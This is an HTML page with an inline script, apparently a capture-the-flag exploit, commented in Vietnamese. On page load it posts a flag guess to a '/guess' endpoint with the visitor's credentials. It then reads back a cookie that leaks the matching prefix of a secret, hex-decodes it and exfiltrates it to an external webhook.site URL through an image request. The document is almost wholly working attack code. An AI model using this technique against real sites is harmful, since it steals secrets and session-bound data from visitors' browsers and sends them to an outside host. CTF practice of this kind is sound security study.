<!DOCTYPE html>
<html><body>
<script>
;(async () => {
  // 1) POST /guess để set cookie.best = common_prefix(prefix, guess)
  await fetch('/guess', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      guess: 'NHNC{',   // phần bạn đang dò, tăng dần trong loop
      note: ''         // bạn không cần payload JS ở đây
    })
  });

  // 2) Đọc thẳng cookie.best
  const raw = document.cookie.split('; ').find(r=>r.startsWith('best='));
  let flag = '';
  if (raw) {
    const val = decodeURIComponent(raw.split('=')[1]);
    // val = hex(prefix) + ':' + hex(note)
    const [hexP] = val.split(':');
    flag = hexP.match(/.{1,2}/g).map(h=>String.fromCharCode(parseInt(h,16))).join('');
  }

  // 3) Exfiltrate ra ngoài
  new Image().src = 'http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(flag);
})();
</script>
</body></html>
